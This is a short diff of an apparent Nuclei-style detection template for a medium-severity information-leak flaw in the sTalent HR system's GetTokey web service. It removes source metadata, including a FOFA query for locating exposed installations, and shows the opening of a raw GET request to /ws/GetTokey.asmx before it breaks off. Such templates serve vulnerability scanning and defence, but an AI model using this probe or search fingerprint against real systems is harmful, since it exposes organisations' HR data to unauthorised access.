@@ -3,12 +3,8 @@ info:
   name: 北京朗新天霁sTalent人力资源系统-GetTokey信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dwc0pgyhcn3sg7cg'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dwc0pgyhcn3sg7cg
-    fofa: body="/default.aspx?ReturnUrl=%2f" && body="silverlight"
 http:
 - raw:
   - 'GET /ws/GetTokey.asmx HTTP/1.1
